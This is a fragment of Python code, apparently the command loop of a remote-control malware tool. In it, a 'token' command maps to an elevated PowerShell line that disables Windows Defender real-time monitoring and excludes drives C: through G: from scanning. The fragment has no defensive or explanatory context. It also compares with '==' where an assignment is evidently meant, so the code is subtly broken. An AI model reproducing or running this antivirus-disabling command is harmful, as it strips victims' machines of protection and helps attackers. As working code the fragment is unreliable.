...
while True:
	...
	if command_to_send == "token":
		...
		command_to_send == '''powershell -Command "Start-Process powershell -Argument 'echo hi;Set-MpPreference -DisableRealtimeMonitoring $true;Set-MpPreference -ExclusionPath E:/, C:/, D:/, F:/, G:/;' -Verb RunAs"'''
